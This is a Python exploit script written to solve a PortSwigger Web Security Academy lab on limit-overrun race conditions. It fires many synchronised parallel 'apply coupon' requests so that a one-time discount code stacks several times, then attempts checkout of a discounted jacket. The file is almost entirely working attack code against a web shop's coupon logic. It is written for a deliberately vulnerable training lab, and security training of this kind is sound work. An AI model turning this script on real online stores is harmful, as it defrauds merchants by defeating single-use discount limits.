# Lab 01 — Limit overrun race conditions
# PortSwigger: https://portswigger.net/web-security/race-conditions/lab-race-conditions-limit-overrun
#
# Vulnerability: A one-time discount code's "already used?" check and
#                "apply the discount" action aren't atomic — parallel
#                requests can all pass the check before any of them
#                finish marking the code as used
# Aim:           Successfully purchase the "Lightweight l33t Leather
#                Jacket" using a stacked discount
#
# Technique:
#   Send the same "apply coupon" POST request many times in parallel
#   (via threading.Barrier synchronisation) against a cart containing the
#   jacket. If several land inside the check-then-act race window, the
#   discount stacks multiple times, driving the price down enough to afford.
#
# Usage: python race_conditions_lab01.py <url> [coupon_code] [num_parallel]

import sys
import re
import urllib3
from proxies import proxies
from race_conditions_utils import (banner, section, make_session, login,
                                    send_parallel, warm_connection, print_box)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def find_product_id(session, url, name_fragment="l33t"):
    r = session.get(url)
    idx = r.text.lower().find(name_fragment.lower())
    if idx != -1:
        window = r.text[max(0, idx - 300):idx + 50]
        m = re.search(r'productId=(\d+)', window)
        if m:
            return m.group(1)
    return "1"


def get_cart_total(session, url):
    r = session.get(f"{url}/cart")
    m = re.search(r'Total:\s*\$?(-?[\d,]+\.\d{2})', r.text)
    return m.group(1) if m else None


if __name__ == "__main__":
    banner()
    section("LAB 01 — LIMIT OVERRUN RACE CONDITIONS (COUPON STACKING)")

    if len(sys.argv) < 2:
        print("  Usage: python race_conditions_lab01.py <url> [coupon_code] [num_parallel]")
        sys.exit(1)

    url = sys.argv[1]
    coupon_code = sys.argv[2] if len(sys.argv) > 2 else "PROMO20"
    num_parallel = int(sys.argv[3]) if len(sys.argv) > 3 else 20

    session = make_session(proxies)
    if not login(session, url):
        sys.exit(1)

    # ── Step 1: add the jacket to the cart ────────────────────────────────
    print("\n  ── Step 1: add the leather jacket to the cart\n")
    jacket_id = find_product_id(session, url)
    session.post(f"{url}/cart", data={"productId": jacket_id, "redir": "PRODUCT", "quantity": "1"})

    total_before = get_cart_total(session, url)
    print_box("Cart total before the race attack", f"${total_before}")

    # ── Step 2: warm the connection ────────────────────────────────────────
    print(f"  ── Step 2: warm the connection\n")
    warm_connection(session, url)

    # ── Step 3: fire the parallel coupon-apply requests ───────────────────
    print(f"  ── Step 3: fire {num_parallel} parallel 'apply coupon' requests\n")
    print("  ℹ  Using threading.Barrier for synchronised dispatch — see")
    print("     module notes on why this approximates but doesn't fully")
    print("     replicate Burp's single-packet attack.\n")

    def make_coupon_request():
        # Each thread uses the SAME session (shared cart state) but fires
        # independently once released by the barrier.
        return session.post(f"{url}/cart/coupon", data={"coupon": coupon_code})

    request_funcs = [make_coupon_request for _ in range(num_parallel)]
    results = send_parallel(request_funcs)

    success_count = sum(
        1 for r in results
        if r is not None and not isinstance(r, Exception) and r.status_code in (200, 302)
    )
    print(f"  ℹ  {success_count}/{num_parallel} requests returned success status codes")

    # ── Step 4: check whether the discount stacked ─────────────────────────
    print("\n  ── Step 4: check the resulting cart total\n")
    total_after = get_cart_total(session, url)
    print_box("Cart total after the race attack", f"${total_after}")

    if total_before and total_after and total_after != total_before:
        print("  ✔  Cart total changed — discount may have applied more than once")
    else:
        print("  ?  Total unchanged — the race window may not have been hit.")
        print("     Try increasing num_parallel, or re-run (timing varies).")
        print("     If pure-Python timing genuinely can't land this, use Burp's")
        print("     'Send group in parallel (single-packet attack)' instead.")

    # ── Step 5: attempt checkout ─────────────────────────────────────────────
    print("\n  ── Step 5: attempt checkout\n")
    r_checkout = session.post(f"{url}/cart/checkout")
    print(f"  ℹ  Checkout status: {r_checkout.status_code}")
    print_box("Checkout response (truncated)", r_checkout.text[:400])
